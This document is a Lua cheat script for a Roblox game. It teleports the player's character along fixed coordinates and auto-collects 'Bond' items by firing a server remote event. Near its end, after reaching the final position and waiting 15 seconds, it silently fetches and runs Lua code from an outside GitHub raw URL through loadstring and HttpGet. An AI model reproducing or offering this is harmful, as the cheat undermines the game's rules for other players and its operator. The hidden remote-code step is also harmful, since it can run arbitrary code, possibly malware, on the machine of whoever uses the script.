local positions = {
    Vector3.new(57, 3, 30000), Vector3.new(57, 3, 28000),
    Vector3.new(57, 3, 26000), Vector3.new(57, 3, 24000),
    Vector3.new(57, 3, 22000), Vector3.new(57, 3, 20000),
    Vector3.new(57, 3, 18000), Vector3.new(57, 3, 16000),
    Vector3.new(57, 3, 14000), Vector3.new(57, 3, 12000),
    Vector3.new(57, 3, 10000), Vector3.new(57, 3, 8000),
    Vector3.new(57, 3, 6000), Vector3.new(57, 3, 4000),
    Vector3.new(57, 3, 2000), Vector3.new(57, 3, 0),
    Vector3.new(57, 3, -2000), Vector3.new(57, 3, -4000),
    Vector3.new(57, 3, -6000), Vector3.new(57, 3, -8000),
    Vector3.new(57, 3, -10000), Vector3.new(57, 3, -12000),
    Vector3.new(57, 3, -14000), Vector3.new(57, 3, -16000),
    Vector3.new(57, 3, -18000), Vector3.new(57, 3, -20000),
    Vector3.new(57, 3, -22000), Vector3.new(57, 3, -24000),
    Vector3.new(57, 3, -26000), Vector3.new(57, 3, -28000),
    Vector3.new(57, 3, -30000), Vector3.new(57, 3, -32000),
    Vector3.new(57, 3, -34000), Vector3.new(57, 3, -36000),
    Vector3.new(57, 3, -38000), Vector3.new(57, 3, -40000),
    Vector3.new(57, 3, -42000), Vector3.new(57, 3, -44000),
    Vector3.new(57, 3, -46000), Vector3.new(57, 3, -48000),
    Vector3.new(57, 3, -49032), Vector3.new(-424, 3, -49032)
}

local duration = 0.5
local bondPauseDuration = 0.7

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:FindFirstChildOfClass("PlayerGui")

local bondCounter = Instance.new("TextLabel")
bondCounter.Size = UDim2.new(0.3, 0, 0.1, 0)
bondCounter.Position = UDim2.new(0.5, 0, 0.7, 0)
bondCounter.AnchorPoint = Vector2.new(0.5, 0.5)
bondCounter.BackgroundTransparency = 0.5
bondCounter.TextScaled = true
bondCounter.Font = Enum.Font.SourceSansBold
bondCounter.TextColor3 = Color3.fromRGB(255, 255, 255)
bondCounter.Text = "Bonds Found: 0"
bondCounter.Parent = screenGui

task.spawn(function()
    task.wait(1)
    screenGui:Destroy()
end)

local foundBonds = {}
local bondCount = 0

local function updateBondCount()
    bondCounter.Text = "Bonds Found: " .. tostring(bondCount)
end

local function safeTeleport(position)
    pcall(function()
        game.Players.LocalPlayer:RequestStreamAroundAsync(position) -- Preload the location
        task.wait(0.3) -- Allow streaming delay
        hrp.CFrame = CFrame.new(position) -- Teleport after streaming
    end)
end

-- **Updated Bond Collection Function**
local function collectAllBonds()
    local bonds = workspace.RuntimeItems:GetChildren()
    local visitedPositions = {}

    for _, bond in ipairs(bonds) do
        if bond:IsA("Model") and bond.PrimaryPart and (bond.Name == "Bond" or bond.Name == "Bonds") then
            local bondPos = bond.PrimaryPart.Position
            table.insert(visitedPositions, bondPos)
        end
    end

    -- **Teleport only to Bonds that still exist**
    for _, bondPos in ipairs(visitedPositions) do
        local bondStillExists = false

        -- Check if the Bond still exists in `workspace.RuntimeItems`
        for _, bond in ipairs(workspace.RuntimeItems:GetChildren()) do
            if bond:IsA("Model") and bond.PrimaryPart and bond.PrimaryPart.Position == bondPos then
                bondStillExists = true
                break
            end
        end

        if bondStillExists then
            safeTeleport(bondPos)
            print("Bond found! Teleporting to " .. tostring(bondPos))
            task.wait(bondPauseDuration)
        else
            print("Skipped deleted Bond at: " .. tostring(bondPos))
        end
    end
end

task.spawn(function()
    for _, pos in ipairs(positions) do
        safeTeleport(pos)
        task.wait(duration)

        if pos == Vector3.new(57, 3, -49032) then
            print("Reached final position, waiting 15 seconds...")
            task.wait(15) -- Wait before executing loadstring
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
            print("Executed loadstring after 15 seconds.")
        end
                        
        -- **Now collects all Bonds first before teleporting back**
        collectAllBonds()

        updateBondCount()
    end
end)

task.spawn(function()
    task.wait(2)

    while true do
        task.wait(0.1)

        local items = game.Workspace:WaitForChild("RuntimeItems")

        for _, bond in pairs(items:GetChildren()) do
            if bond:IsA("Model") and bond.Name == "Bond" and bond.PrimaryPart then
                local dist = (bond.PrimaryPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                if dist < 100 then
                    game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Network"):WaitForChild("RemotePromise"):WaitForChild("Remotes"):WaitForChild("C_ActivateObject"):FireServer(bond)
                    print("Bond collected:", bond.Name)
                end
            else
                warn("PrimaryPart missing or object name mismatch for Bond!")
            end
        end
    end
end)
